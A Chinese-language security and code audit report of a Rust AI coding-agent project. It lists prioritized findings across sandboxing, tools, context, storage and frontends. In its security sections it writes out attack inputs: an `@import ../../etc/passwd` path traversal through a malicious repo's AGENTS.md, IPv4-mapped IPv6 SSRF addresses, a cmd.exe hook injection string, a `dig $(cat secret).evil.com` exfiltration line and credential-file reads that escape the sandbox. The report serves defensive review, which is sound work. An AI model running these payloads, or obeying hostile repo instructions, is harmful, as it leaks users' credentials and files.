# 第五轮全面审查报告（R5）

审查日期：2026-08-27
审查范围：全项目（18 crate + web 前端 + 文档 + CI/CD），八领域深审
方法与验证：五路并行子系统深审（security/sandbox、providers/tools、context/memory、storage/journal/mcp、server/protocol/frontends）+ 关键发现手工复现（SSRF 绕过实测、`@import` 逃逸实测、SDK 无默认 feature 编译实测、DTO 漂移 diff 验证）+ 构建与测试基线确认。

---

## 0. 总体评价

**项目成熟度高**：模块化架构（18 crate 单向依赖）、零实现 core、trait 集中定义、Event Sourcing、四形态前端共享 Runtime 的目标与实现均属同类项目（Claude Code 开源复刻）中领先水平。文档完备（25 篇、3.7 万行），约束体系（C-01..C-35）与实现映射清晰，且已历经三轮系统审查（R2/R3/R4）修复了大量问题。

**但仍有实质性问题**：本轮发现 **P0 × 2、P1 × 9、P2 × 30、P3 × 30+**。其中两个 P0 均为"恶意仓库即可利用"的本地数据外泄通道（`@import` 路径逃逸、SSRF IPv4-mapped IPv6 绕过）；两个 P1 为声称已修复但未实现/未生效的安全防护（Windows Hook 占位符注入、macOS Seatbelt 凭证读取）；一个 P1 为构建断链（SDK `--no-default-features` 无法编译）；一个 P1 为 CI 必然失败项（生成 DTO 过期）。另有"四形态前端共享 Runtime"的承诺与 server 侧实际装配存在显著能力落差（无 Hooks、无项目文档注入、无 git/web/memory 工具）。

---

## 1. 项目定位与差异化优势

### 1.1 定位评估

与 Claude Code / Codex CLI 相比，minicoding-rs 的核心差异化在于**"安全可控的运行时"而非"功能堆叠"**：

| 维度 | Claude Code / Codex | minicoding-rs |
|------|--------------------|---------------|
| 语言/形态 | TypeScript/Node，单一 CLI | Rust 原生，CLI/TUI/Web/Desktop 四形态 |
| 沙箱 | 应用层近似 | landlock/Seatbelt/Job Object 内核级第二道防线（C-22/C-30） |
| 架构 | 单体 | 18 crate 分层 + 零实现 core + trait 抽象 |
| 约束 | 提示词约束为主 | C-01..C-35 三级约束，L0 由 Rust 强制 |
| 可观测 | 有限 | OTel 一等公民、Event Sourcing、审计日志 |
| 可嵌入 | 无 SDK | `minicoding-sdk` 嵌入 + `minicoding-server` 多协议（HTTP/SSE/ACP/LSP/NDJSON） |

### 1.2 差异化优势（成立部分）

1. **沙箱深度**：Linux landlock（ABI 探测 + pre_exec 应用 + fail-closed）、macOS Seatbelt（FFI 正确性验证通过）、Windows Job Object（诚实标注 is_hardened=false）——三平台均有真实内核机制落地，优于多数复刻项目。
2. **权限-交互分离**：`PermissionPolicy`（决策）与 `PermissionPrompter`（交互）分离解决了 broadcast 无法承载点对点回复的架构缺陷。
3. **约束-实现映射**：C-01..C-35 每条都有 `rules.md` §6 映射到实现文件，且审查验证大部分 L0 确实在实现层强制（C-01/C-02/C-05/C-06/C-21/C-23/C-27/C-29 已验证 ✓）。
4. **审计完备性**：权限决策全路径落 audit.log（除 MCP C-24 与 Hook 协议违规两处缺口，见 §4.4）。
5. **工程化**：10 道 CI 门禁（fmt/clippy/test/coverage/audit/deny/typos/交叉平台/web/desktop）、pre-commit 钩子、cargo-dist 多平台发布、conventional commits + git-cliff。

### 1.3 定位风险

1. **"四形态共享 Runtime"名不副实**（见 §5.1）：CLI/TUI 走 SDK builder（全量能力），Web/Desktop 走 server builder（缩减能力：无 Hooks、无 AGENTS.md 注入、无 git/web/memory 工具、无 task.spawn 真实执行）。营销文档（README §6、docs/design.md §26）宣称"所有形态共享统一配置优先级"正确，但能力一致性未达成。
2. **AGPL-3.0 许可**限制了商业采用面（对标 CC 的商业订阅模式）。
3. **M9 Web/Desktop 为低优先级**，功能覆盖面（尤其 Web 的权限弹窗、桌面 sidecar 生命周期）仍有粗糙处（见 §5）。

---

## 2. 模块化架构（18 crate）

### 2.1 职责边界（评价良好）

- 依赖方向单向无环，架构守卫测试（每 crate `tests/architecture.rs`）强制依赖白名单——已用 cargo 验证依赖图干净。
- core 零实现原则执行到位（压缩算法/黑名单/landlock/rmcp 调用/JSONL 均未进 core）。
- trait 集中在 core 的定义表与实现位置吻合（`modules.md` §3.3 对照核实）。

### 2.2 问题

| # | 级别 | 位置 | 问题 |
|---|:---:|------|------|
| ARCH-1 | P1 | `minicoding-sdk` Cargo.toml | **构建断链**：`--no-default-features`（AGENTS.md §3.5 标准 feature 门控模式）无法编译——`long_term_store`/`memory_query_slot` 仅定义于 `extensions` feature 下却被无条件引用（已实测 `cargo check -p minicoding-sdk --no-default-features --features cred-keyring` 失败）。 |
| ARCH-2 | P2 | `minicoding-server/src/runtime_builder.rs` | server 与 SDK 两个 Runtime 装配点能力落差（详见 §5.1），违反"四形态一致性"设计目标。 |
| ARCH-3 | P3 | `runtime_builder.rs:269-270` | `config_hash_val` 计算后 `let _ =` 丢弃——死代码（SDK 侧用于 resume 校验）。 |
| ARCH-4 | P3 | `desktop/src/config.rs:64` | `save_provider_config` 不剥离 `provider.api_key`——前端传入即明文落 `config.toml`，与 C-04 相悖（http.rs 侧有剥离，desktop 无）。 |
| ARCH-5 | P3 | `extension-sdk/src/bundled.rs:215-220` | `on_config_changed` 持读锁跨扩展回调，误用扩展可死锁（同文件其他路径刻意避免持锁回调）。 |
| ARCH-6 | P3 | `extension-sdk/src/registrar.rs:37-45` | 0.x 版本下 `^0` 兼容检查形同虚设（"跨大版本拒绝"测试是空转断言）。 |

---

## 3. AI Provider 与工具系统

### 3.1 Provider

| # | 级别 | 位置 | 问题 |
|---|:---:|------|------|
| PT-1 | P2 | `providers/src/openai.rs:160-183` | `thinking_budget_tokens` 静默丢弃——trait 声明"由实现自行决策"，OpenAI 实现既未映射 `reasoning_effort` 也不告警，用户配置无感失效。 |
| PT-2 | P3 | `openai.rs:160-183` | o1/o3 系列推理模型门控只过滤 temperature/top_p，`stop`/`seed` 未门控——部分推理模型拒绝这些参数产生神秘 400。 |
| PT-3 | P3 | `openai.rs:209-218`、`anthropic.rs:236-247` | `Capabilities` 硬编码（128K/200K/4096/32768），与模型无关——DeepSeek 64K、GPT-4.1 1M 等模型压缩行为错误。 |
| PT-4 | P3 | `openai.rs:486-496` | 未解析 `completion_tokens_details.reasoning_tokens`——推理模型输出 token 低估。 |
| PT-5 | P3 | `openai.rs:402-469` | `refusal` 非空且 `finish_reason=content_filter` 时推入两个 `Delta::Stop(Filtered)`。 |
| PT-6 | P3 | `common/retry.rs:48` vs `openai.rs:89` | Retry 超时（60s）与客户端读超时（300s）不一致。 |

### 3.2 工具系统

| # | 级别 | 位置 | 问题 |
|---|:---:|------|------|
| TL-1 | **P1** | `tools/src/git/diff.rs:139` | **git.diff 输出不截断**——唯一一个不经过 `truncate_output` 的读工具，大仓库 diff 可达 MB 级直接入上下文，违反 C-07（其余工具均有上限）。 |
| TL-2 | P2 | `tools/src/web/search.rs:70,140` | `max_output_bytes.max(64KiB)` 抬低下限 + 最终文本不截断——配置 1KB 也会吃至少 64KB 预算。 |
| TL-3 | P2 | `core/src/tool/trait.rs:196-197` vs `registry.rs:45-48,59` | `Tool::name()` 与 `schema().name` 双事实源——注册键用前者、schema 列表用后者，第三方/MCP 工具不同步时 dispatch 静默失败。 |
| TL-4 | P3 | `core/src/tool/registry.rs:45-48` | `register` 同名静默覆盖，无告警。 |
| TL-5 | P3 | `tools/src/fs/glob.rs:103-107` | Windows 路径分隔符（`\`）与 globset `/` 模式不匹配。 |
| TL-6 | P3 | `shell/background.rs:139` | background 路径用 `ctx.env` 而不像 `shell.run` 用 `env_clear`+白名单——ctx.env 若积累非白名单变量则后台泄漏。 |
| TL-7 | P3 | `task/spawn.rs:279-284` | 子代理摘要不截断。 |
| TL-8 | P3 | `web/fetch.rs:275` | 重定向 Location 大小写敏感（`HTTPS://` 误判相对路径）。 |
| TL-9 | P3 | `git/apply.rs:18-56` | 补丁路径校验只查 `---`/`+++` 行，不查 `diff --git` 行。 |

### 3.3 正向确认

- `shell.run` 的进程组 kill、输出上限、超时钳制、env 清洁、脱敏均正确（§安全审查确认）。
- `DeltaAccumulator` 分片合并正确。
- `worktree` 实现安全（env 清洁、分支名注入防护、合并失败保留分支）。
- `web.fetch` 的 SSRF + IP pinning + 手动重定向逐跳校验 + 10MiB 上限完备（除 IPv6-mapped 绕过见 §4.3）。

---

## 4. 安全权限模型与三平台沙箱

### 4.1 P0（已复现）

| # | 位置 | 问题 |
|---|------|------|
| SEC-1 | `memory/src/project_doc/loader.rs:69-73` | **`@import` 路径包含判定不消解 `..`**：`path_within` 仅组件级前缀比较，`repo/.../deep/../../../../etc/passwd` 组件前缀命中 base_dir 即放行。**已实测复现**：恶意仓库（克隆即触发）经 `AGENTS.md` 的 `@import ../../etc/passwd` 把本机任意文件展开进 `<project_doc>` 外发 LLM 厂商。现有测试只覆盖"文件不存在"分支，从未命中逃逸路径。CT4-3 修复形同虚设。 |
| SEC-2 | `policy/src/ssrf.rs:164-181` | **IPv4-mapped IPv6 绕过 SSRF**：`check_ipv6` 不检查 `to_ipv4_mapped()`。**已实测复现**：`[::ffff:169.254.169.254]`/`[::ffff:10.0.0.1]`/`[::ffff:127.0.0.1]` 的 is_loopback=false、is_unicast_link_local=false、非 fc00::/7 → 全部放行，可直达云元数据接口/内网/回环。`web.fetch` 的 DNS 解析与 IP 固定同样以放行后的 mapped 地址为准。 |

### 4.2 P1

| # | 位置 | 问题 |
|---|------|------|
| SEC-3 | `hooks/src/script.rs:98-123` | **Windows Hook 占位符注入（声称已修复，实际未修复）**：注释声明"Windows 禁用占位符展开"，但 `#[cfg(windows)]` 块只打 warn，`expand_placeholders` 无条件执行（:112），值经 POSIX 单引号转义后拼进 `cmd /C`——`cmd.exe` 不识别单引号，`" & calc & "` 仍为活动字符 → LLM 可控输入在 Hook 子进程内任意命令执行。 |
| SEC-4 | `sandbox/src/macos.rs:197` | **macOS Seatbelt 子进程可读全部凭证**：profile 以 `(allow file-read*)` 开头只禁写——sandboxed `shell.run` 可 `cat ~/.ssh/id_rsa`、`~/.aws/credentials` 复制到可写 workdir。Linux A3（HOME 读白名单）已封此通道，macOS 未移植，`is_hardened()=true` 造成"已加固"假象。 |
| SEC-5 | `hooks/src/script.rs:126-137` | **Hook 子进程不接 OS 沙箱（C-26 未实现）**：`run_script_hook` 只做 env_clear+白名单，从不调 `SandboxDriver::apply`、不 setpgid——仓库携带的恶意 Hook（对标恶意 AGENTS.md 场景）以完整用户权限运行。async_rewake.rs/permission.rs 注释声称"C-26 由调用方执行"但唯一执行路径 ScriptHook 未实现。 |
| SEC-6 | `sandbox/src/denial.rs:105-106` + `breaker.rs:22-31` | **沙箱拒绝"权威标记"可被伪造**：`\x01MINICODING_DENIED_ERRNO=1\x02` 控制字符序列子进程可轻易 printf 输出 → 恶意命令可触发 C-30 熔断（Agent 循环 DoS）或误导归因。 |

### 4.3 P2

| # | 位置 | 问题 |
|---|:---:|------|
| SEC-7 | `hooks/src/script.rs:158,192` | Hook stderr 无上限（stdout 有 1MiB 截断）——写大 stderr 的 Hook 可 OOM（C-07 部分违反）。 |
| SEC-8 | `linux.rs:276-282,410-420` | landlock 网络限制仅 TCP；security.md 声称"默认禁 TCP/UDP"失实——UDP/DNS 外发仍可（`dig $(cat secret).evil.com` 通道）。 |
| SEC-9 | `windows.rs:239-289` | **Windows Job Object 仅约束进程生命周期+UI**：无文件系统/网络/内存限制（is_hardened()=false 如实标注，但"WorkspaceWrite 沙箱化子进程可写任意路径"未写入文档强调）；builtin.rs:139-142 注释自认 `cargo build > ~/.ssh/authorized_keys` 在 Windows 上"真实发生"。 |
| SEC-10 | `windows.rs:38-45,150-180` | Windows post_spawn 队列按 pid 消费无可关联性——并发 spawn 下 WorkspaceWrite 子进程可能无 Job Object 直接运行（竞态静默关闭唯一 Windows 遏制手段）。 |
| SEC-11 | `hardening.rs:133-161` | A3 HOME 读白名单仍含 `~/.config`/`~/.cache`/`~/.cargo`/`~/.npm`——`~/.config/gh/hosts.yml`、`~/.cargo/credentials`、`~/.npmrc` 等活凭证可被读取外泄，"凭证目录不可读"声明过强。 |
| SEC-12 | `policy/src/ssrf.rs:101-109` | DNS 重绑定无防护（check 与 connect 各自解析），文档自认 M5+ 未接。 |
| SEC-13 | `policy/src/path_sandbox.rs:42-67` | 路径沙箱 check-then-use TOCTOU；Linux/macOS 有 OS 沙箱兜底，**Windows 无**——Windows 上 TOCTOU 窗口是唯一防线。 |
| SEC-14 | `policy/src/redact.rs:18-29,88-114` | 脱敏漏 URL 嵌入凭证（`DATABASE_URL=postgres://user:pass@host`）——键名不含关键字、值未脱敏，`fs.read` .env 后回灌 LLM/JSONL。 |
| SEC-15 | `hooks/src/script.rs:167-174` | Hook 超时仅杀直接子进程（kill_on_drop），孙进程孤儿。 |
| SEC-16 | `mcp/src/approval.rs:230-259` + `sdk/src/mcp_setup.rs:49-55` | **C-24 批准决策不落 audit.log**（违反 AGENTS.md §5.5）；approval.rs:122-144 还先默认权限写 tmp 再 chmod 0600（短暂 0644 窗口）+ 无 fsync。 |
| SEC-17 | 全仓 | `AuditKind::HookRun` 仅存在于测试引用（core/storage/trait.rs:143）——**Hook 协议违规/asyncRewake 协议错误从不记审计**（AGENTS.md §5.5 承诺未实现；`minicoding-hooks` 零 AuditSink 使用）。 |
| SEC-18 | `mcp/src/client/wrapper.rs:101-112` | 远端 JSON schema 无法编译时**fail-open** 跳过校验直接转发参数。 |
| SEC-19 | `mcp/src/client/rmcp.rs:639-652` | warm_up 刷新工具不走 `convert_rmcp_tools`——enabled_tools 过滤丢失、hints 过期、非法工具名注册裸名（不可调用）。 |

### 4.4 L0 强制力验证汇总

| 约束 | 状态 | 备注 |
|------|:---:|------|
| C-01 副作用经权限 | ✅ | 双路径（串行+只读桶拒绝审计）完备 |
| C-02 黑名单不可覆盖 | ✅ | builtin 优先级最高 + C-21 双重保障 |
| C-03 路径不可越界 | ⚠️ | TOCTOU（SEC-13）；Windows 无 OS 兜底 |
| C-04 凭证不可外泄 | ⚠️ | env 层 ✓；**macOS 文件读取通道未封**（SEC-4）、A3 白名单残留（SEC-11）、redact 漏 URL 凭证（SEC-14） |
| C-05 输出非指令 | ✅ | 边界包裹 + 声明 |
| C-06 回放禁副作用 | ✅ | replay.rs 强制 |
| C-07 资源上限 | ⚠️ | git.diff 不截断（TL-1）、Hook stderr 无上限（SEC-7） |
| C-21 Hook 不覆盖 L0 | ✅ | 合并取严 + modify_input 重查 |
| C-22 沙箱二道防线 | ⚠️ | **Hook 子进程不受沙箱**（SEC-5）、Windows 仅进程级（SEC-9）、macOS 读通道（SEC-4） |
| C-23 AGENTS.md 不可自编 | ✅ | Ask + 不可 AllowAlways |
| C-24 MCP 首批 | ⚠️ | 流程 ✓ 但**不记审计**（SEC-16） |
| C-26 asyncRewake 不越权 | ❌ | 无 OS 沙箱（SEC-5） |
| C-27 Auto memory 隔离 | ✅ | 物理隔离 + 指令性降级 + 边界 |
| C-28 Journal 防绕权限 | ✅ | 冲突检测 + 不落盘 + 审计 |
| C-29 压缩熔断 | ✅ | Runtime 状态机，LLM 不可触达 |
| C-30 沙箱熔断 | ⚠️ | 标记可伪造（SEC-6） |

---

## 5. 四形态前端与 Runtime 一致性

### 5.1 P2：Server 与 SDK Runtime 装配落差（ARCH-2）

`minicoding-server/src/runtime_builder.rs` 相对 `minicoding-sdk/src/builder.rs` 缺失：

1. **AGENTS.md/项目文档注入**——server 会话完全看不到项目指令层（C-23 相关上下文），Web/Desktop 用户行为与 CLI/TUI 显著不同；
2. **Hook registry**——runtime_builder.rs:10-12 自认"Hook 未接线"，Web/Desktop 会话无 Hooks 能力；
3. **git/web/memory/UI 工具**——只注册 readonly+write+shell+task 四组，`git.*`、`web.*`、`memory.*`、`ui.ask` 全部缺失；
4. **task.spawn**——`InProcessSubagentRunner` 未注入，返回 NotConfigured；
5. **AutoMemory / 配置热更新（S-22）**——缺失。

### 5.2 其他前端问题

| # | 级别 | 位置 | 问题 |
|---|:---:|------|------|
| FE-1 | P1 | `web/src/api/generated/` | **生成 DTO 过期**：Rust `StopReason` 已加 `Filtered { reason }` 变体（session.rs:90），提交的 `StopReason.ts` 无此变体——CI `git diff --exit-code` 必失败（已实测：重生成后 diff 可见）；且工作树处于"半生成"状态（ts-rs 原始输出未经 gen-types-post+oxfmt 后处理）。 |
| FE-2 | P2 | `tui/src/app.rs:616,344-350` | **用户消息双显**：submit 乐观入列 + `MessageAppended` 事件再次入列，无去重。 |
| FE-3 | P2 | `tui/src/render/markdown.rs:197` | 按字节 `bytes[i] as char` 渲染——所有多字节 UTF-8（CJK/emoji）全部乱码。 |
| FE-4 | P2 | `tui/src/app.rs:826-829` | 权限弹窗固定高 7、`(height-7)/2` 无 min——<7 行终端 u16 下溢 panic。 |
| FE-5 | P2 | `cli/src/commands/cred.rs:68-79` | `cred store` 注释声称"不回显"但用 `stdin().read_line()` 明文回显 API key（shell scrollback 泄露）。 |
| FE-6 | P2 | `desktop/src/sidecar.rs:280-295` | 重复 `start_session` 覆盖受管 state，旧 sidecar（含独立 token 的 HTTP server）成孤儿进程。 |
| FE-7 | P2 | `server/src/lsp.rs:152-203` | 并发 `executeCommand` 各自订阅全会话事件转发——双份 token/进度通知。 |
| FE-8 | P2 | `server/src/acp.rs:243-248`、`ndjson.rs:98-99` | stdio 协议 Content-Length/行读取无上限——本地客户端可 OOM server。 |
| FE-9 | P2 | `server/src/ndjson.rs:474-521` | NDJSON 自造每 turn seq=1..n，与 SSE/ACP/LSP 的会话级 cursor seq 空间不一致——跨协议切换/重连破坏游标语义。 |
| FE-10 | P3 | `sdk/src/store.rs:48-67` | `InMemoryStorage` 生产代码 `lock().expect("mutex poisoned")`——毒化锁直接 panic 嵌入进程（全仓其余处均 `into_inner`）。 |
| FE-11 | P3 | `server/src/acp.rs:272-280` | 解析错误发自定义 notification 而非 JSON-RPC `-32700` error response；protocol/jsonrpc.rs:102-109 接受 result/error 同缺或同在的非法形态。 |
| FE-12 | P3 | `server/src/ndjson.rs:261-275` | CreateSession 不预校验 workdir（HTTP 路径校验）。 |
| FE-13 | P3 | `server/src/http.rs:573-575` | server workdir 不规范化（SDK/CLI 均规范化）——相对路径隐式绑定 server CWD。 |
| FE-14 | P3 | `cli/src/otel_init.rs:44` vs server/TUI | CLI 日志默认 `warn`、server/TUI 默认 `info`——形态间可观测性不一致。 |
| FE-15 | P3 | `server/src/http.rs:246-248,747` | `SendMessageBody.text` 不校验非空。 |
| FE-16 | P3 | `server/src/http.rs:783-789` | `DELETE /sessions/{id}` 不取消 in-flight turn（evict 路径有 try_lock，DELETE 无）。 |
| FE-17 | P3 | `server/src/session_mgr.rs:285-330` | 空闲驱逐不感知 SSE 订阅者——开着 Web 标签页的会话被驱逐。 |
| FE-18 | P3 | `desktop/src/lib.rs:9`、`server/src/main.rs:62` | 文档与实际 CLI 参数/默认 CORS 不符（`--http` 不存在；"默认允许任意来源"实为仅本地）。 |

---

## 6. 上下文管理（4 级压缩）与记忆

### 6.1 P0

`@import` 逃逸（SEC-1）同时是上下文/记忆域问题，见 §4.1。

### 6.2 P1

| # | 位置 | 问题 |
|---|------|------|
| CTX-1 | `context/src/manager.rs:540,596-622,344-358` | **压缩"成功"判据漏计 post-compact 注入与 hook 上下文**：`fixed_overhead` 基于 base_system 计算，post_compact 文件注入（默认预算 5 万 token）随后叠加——压缩判定成功时真实请求可能超窗 → provider 400，且熔断器检测不到（不 record_oversize），CT4-2 修复目标被架空。 |
| CTX-2 | `manager.rs:346,355-358` | **固定开销过大 → 小窗口模型"熔断死亡"**：`effective_threshold = threshold - fixed_overhead` 可归零——任何消息都 oversize → thrash 熔断，会话第一条消息都发不出，无降级路径。 |

### 6.3 P2

| # | 位置 | 问题 |
|---|------|------|
| CTX-3 | `manager.rs:485-495` | append 的 token 缓存更新在 push 之后、fetch_add 之前存在锁外窗口——并发 compress 重算含新消息 + 增量双计（当前被 turn_gate 掩盖，属潜伏竞态）。 |
| CTX-4 | `manager.rs:487` vs `tokenizer.rs:137` | 每消息计 reply-priming（3 token），全量重算只计一次——N 条消息后缓存虚高 3×(N-1)，长会话系统性提前压缩。 |
| CTX-5 | `rt.rs:420-458` + `interactive.rs:191` | **会话摘要只写不读**：`summarize_session` 落盘 index.json 后全仓无消费方——"跨会话恢复"（T-M3-6）只实现生成半边，注入半边未通车。 |
| CTX-6 | `session_sum.rs:70-74` | 摘要 LLM 输入只用 `text()` 丢弃工具结果内容——与分词器口径（full_text）不一致，工具主导会话摘要质量系统性下降。 |
| CTX-7 | `memory/src/project_doc/loader.rs:69-73`（同型） | `post_compact.rs:162-171` `path_within_workdir` 同样不消解 `..`（当前输入已被 C-03 校验过，风险低但同模式隐患）。 |

### 6.4 P3（择要）

- `budget.rs:53-55` 硬编码 0.85，`config.budget_ratio` 字段零消费（死配置）；
- `mod.rs:102-103` `CompressResult.backup` 死字段；
- `restore` 不重置 append_seq → `/clear` 后审计区间锚点失准；
- L2 summarize 不豁免 pinned（×2.0 权重可被覆盖），与 L3/L4 pinned 豁免语义不一致；
- L1 无条件先裁所有大 tool_result（破坏性丢内容），即使超阈主因是历史消息；
- mtime 缓存跨进程粗粒度下 stale（long_term 有 hash warn 兜底，auto 无）；
- `repair_request_messages` 剥掉所有 System 消息与压缩管道"System 不可压缩"矛盾；
- `is_sticky` 恒 false——"错误/未提交变更 ×1.5"权重保护（design §3.2）未实现。

### 6.5 正向确认

- 4 级压缩顺序、预算数学、tool_use/tool_result 配对原子组替换、降级链均正确；
- C-29 熔断状态机确实不可被 LLM 绕过（唯一入口是压缩结果回调）；
- C-27 物理隔离 + 指令性降级 + 边界注入完整。

---

## 7. 存储 / Journal / MCP

| # | 级别 | 位置 | 问题 |
|---|:---:|------|------|
| ST-1 | P1 | `core/runtime/sourcing.rs:148` + `storage/replay.rs:108-114` + `event_store.rs:126-143` | **best-effort 事件持久化 → seq 缺口 → `--replay` 永久报废**：单次瞬时 IO 失败（磁盘满）后事件流出现缺口，replay 要求严格连续 seq，缺口即 `ReplayError::SeqGap` 且无回退到消息日志的路径（回退仅当事件文件整体不存在）。 |
| ST-2 | P2 | `jsonl.rs:607-608` + `index.rs:107-139` | 跨进程 `index.json` 写丢失：全局 index 的 tmp+rename 无锁，双进程不同会话同时写 → last-rename-wins，静默丢条目。 |
| ST-3 | P2 | `snapshot_store.rs:107-125` | 异步 save 用固定 tmp 文件名（跨进程竞态）+ rename 后不 fsync 父目录；`load_sync` Corrupted 无回退（启动即 RuntimeError::Storage）。 |
| ST-4 | P2 | `rt.rs:550,625,759` vs `sourcing.rs:148` | 消息/事件双写分歧无对账——resume 与 replay 产出不同会话内容且无校验。 |
| ST-5 | P2 | `journal_impl.rs:24,84-91` | journal 内存上限仅条数（200），无字节上限——会话触碰多 MB 文件可占数百 MB-RAM（"内存上限"文档承诺未兑现）。 |
| ST-6 | P2 | `mcp/client/rmcp.rs:679-693` | `shutdown()` 持写锁 `cancel().await` 无超时——rmcp cancel→close 等待后台 task，stdout 不关闭的 server 使 shutdown 永久挂起（start_one 的 stale 路径正确用了 5s 超时）。 |
| ST-7 | P3 | `jsonl.rs:662-678` | `delete` 不取会话锁——并发 append 重建文件产生孤儿会话。 |
| ST-8 | P3 | `jsonl.rs:391-402` | 会话扫描把 `{session}.events.jsonl` 当消息文件解析（warn 噪音+IO 浪费）。 |
| ST-9 | P3 | `event_store.rs:126-143` | 每次 append 全文件读校验单调性——O(N) 且与消息 append 共享锁，长会话平方级 IO。 |
| ST-10 | P3 | `event_store.rs:68-83` | `next_seq_sync` 无锁读尾部，并发进程可撞 seq。 |
| ST-11 | P3 | `audit.rs:34-44` | audit.log 依赖 O_APPEND 单写原子性，无锁——NFS 等网络 FS 上可交错。 |
| ST-12 | P3 | `mcp/client/rmcp.rs:718-724` | Audio 内容块被转成 `ToolContent::Image`。 |
| ST-13 | P3 | `mcp/client/rmcp.rs:417-444` | 注释声称"并发启动"实为串行循环（文档与行为不符）。 |

---

## 8. 文档与工程化

### 8.1 文档完备性（总体优秀）

- 25 篇文档 3.7 万行，design/api/modules/rules/security/data-model 覆盖完整；R2-R4 审查报告记录在案；章节编号、引用路径、功能统计（205 项合计校验通过）均严格。
- 代码注释质量高：多数修复点带审查编号（CORE-x/R3-x/CT4-x）与"why not what"解释。

### 8.2 文档问题

| # | 级别 | 位置 | 问题 |
|---|:---:|------|------|
| DOC-1 | P2 | `security.md §8` | landlock 网络限制表述失实（"默认禁 TCP/UDP"——实现仅 TCP）；`§8.7` 仍列已被替换的 `Sandbox violation`/`sandbox-exec` 拒绝签名（denial.rs 已改 `sandbox_init failed`）；`§8.12` A3 声明过强（见 SEC-11）；macOS 凭证读通道未如实披露（SEC-4）。 |
| DOC-2 | P2 | `server/src/lib.rs:26` | "POST /sessions/{id}/messages → 阻塞至 turn 完成"——实际 202 非阻塞。 |
| DOC-3 | P3 | `modules.md`/`design.md` §26 | "四形态共享 Runtime"表述需补充 server 能力差异声明（ARCH-2）。 |
| DOC-4 | P3 | `main.rs:62`（server） | "--http" 参数不存在；"默认允许任意来源"与实现（仅本地）不符。 |
| DOC-5 | P3 | `hooks/src/script.rs:98` | 注释声称 Windows 已禁用展开——实现未禁用（SEC-3 根因）。 |

### 8.3 CI/CD 与工程化

| # | 级别 | 位置 | 问题 |
|---|:---:|------|------|
| ENG-1 | P1 | CI web job | 生成 DTO 校验门禁当前必失败（FE-1）——main 分支 CI 是红的（若 gen-types 管线被触发）。 |
| ENG-2 | P2 | `rust-toolchain.toml` | 钉 `nightly-2026-08-18`——MSRV 1.99 stable 声称与实际 nightly 工具链不一致，rust-version 字段与工具链使用矛盾；nightly 依赖使依赖树无法复现于 stable。 |
| ENG-3 | P3 | `.github/workflows/ci.yml` | coverage 门禁 ≥80% 是否强制未在报告中验证；`__pycache__/` 目录在仓库根（未跟踪?）。 |
| ENG-4 | P3 | 仓库卫生 | `tmp/`、`__pycache__/`、`tsconfig.tsbuildinfo`、`node_modules` 是否被 .gitignore 覆盖未完全确认；`docs/history/` 与根 README 有重复。 |

---

## 9. 生产级可靠性风险清单（汇总）

### 9.1 安全风险（可被恶意仓库/恶意 LLM 输出触发）

1. **[P0]** `@import ../../` 读取本机任意文件外发（克隆恶意仓库即中招）；
2. **[P0]** SSRF IPv4-mapped IPv6 绕过（fetch 内网/元数据）；
3. **[P1]** Windows Hook 占位符注入（LLM 可控输入 → Hook 进程任意命令）；
4. **[P1]** macOS 沙箱子进程读全部凭证；
5. **[P1]** Hook 子进程无 OS 沙箱（C-26）；
6. **[P2]** 沙箱拒绝标记伪造（熔断 DoS）；
7. **[P2]** Windows 唯一遏制（Job Object）存在竞态失效路径。

### 9.2 可靠性风险

8. **[P1]** `--replay` 因单次 IO 故障永久报废（无自愈）；
9. **[P1]** SDK 无默认 feature 编译断链（发布形态矩阵缺口）；
10. **[P2]** 消息/事件双写分歧无对账（resume 与 replay 内容不一致）；
11. **[P2]** server 四形态能力落差（Web/Desktop 用户无 AGENTS.md/Hooks/git/web 工具）；
12. **[P2]** 会话摘要"只写不读"（跨会话恢复未通车）；
13. **[P2]** 压缩成功判据漏计注入（超窗静默）；
14. **[P2]** journal 无字节上限（内存失控）。

### 9.3 体验风险

15. **[P2]** TUI 用户消息双显 + CJK 乱码 + 小终端下溢；
16. **[P2]** CLI `cred store` 回显密钥；
17. **[P2]** 桌面 sidecar 孤儿进程。

---

## 10. 修复计划（分阶段）

### 阶段 A — 安全 P0/P1（SEC-1/2/3/4/5/6 + 回归测试）
A1. `@import` 词法规范化（消解 `..`）+ 真实越界文件回归测试；
A2. SSRF IPv4-mapped IPv6 检查 + 测试；
A3. Windows Hook 占位符禁用（真正实现注释承诺）+ stderr 上限；
A4. macOS Seatbelt 凭证目录读禁（home 白名单策略）+ 文档如实披露；
A5. Hook 子进程接 OS 沙箱（C-26 落地，经 ShellSandbox 复用 sandbox apply）+ 审计接入；
A6. 沙箱拒绝标记加随机化/双通道校验（防伪造）。

### 阶段 B — 构建与 CI 红修复（ARCH-1/FE-1/ENG-1）
B1. SDK feature 门控修复（`--no-default-features` 可编译）；
B2. 重跑 `pnpm gen-types` 全管线提交生成产物（含 StopReason.Filtered）。

### 阶段 C — 工具/Provider 修复（TL-1/2/3、PT-1..4）
C1. git.diff 输出截断；C2. web.search 输出上限；C3. schema.name 一致性校验；C4. thinking_budget 告警/映射；C5. Capabilities 按模型。

### 阶段 D — 上下文/记忆修复（CTX-1..7）
D1. 压缩成功判据含 post-compact/hook 注入；D2. 固定开销归零降级；D3. token 缓存竞态与 reply-priming 漂移；D4. 会话摘要消费接线或文档降级；D5. 摘要输入用 full_text；D6. post_compact path_within 统一修复。

### 阶段 E — 前端/存储/MCP 修复（FE-2..18、ST-1..13、SEC-16/17）
E1. TUI 双显/CJK/下溢；E2. cred store 隐藏输入；E3. sidecar 孤儿；E4. LSP 双转发；E5. ACP/NDJSON 上限；E6. NDJSON seq 对齐；E7. replay seq 缺口自愈；E8. index.json 跨进程锁；E9. journal 字节上限；E10. MCP shutdown 超时；E11. MCP C-24 审计；E12. Hook 审计接入；E13. server 能力补齐（AGENTS.md/Hooks/git/web/memory）或文档降级声明。

### 阶段 F — 文档同步（DOC-1..5）与收尾
F1. security.md 沙箱表述修正；F2. server 文档修正；F3. script.rs 注释；F4. 工具链/工程化条目。

---

## 11. 结语

本项目在同类 Rust 复刻项目中属于第一梯队：架构纪律、约束落地、文档完备、审查文化（R2→R5 四轮）均为亮点。但"宣称-实现"差距是本轮最大主题：四处"声称已修复/已实现"而实际未生效（SEC-3 Windows 占位符、CT4-3 @import 逃逸、C-26 Hook 沙箱、审计全覆盖承诺），加两处 CI 必然失败（DTO 过期、SDK feature 断链）。安全域两个 P0 均为"仓库即边界"攻击面，应最优先处置。
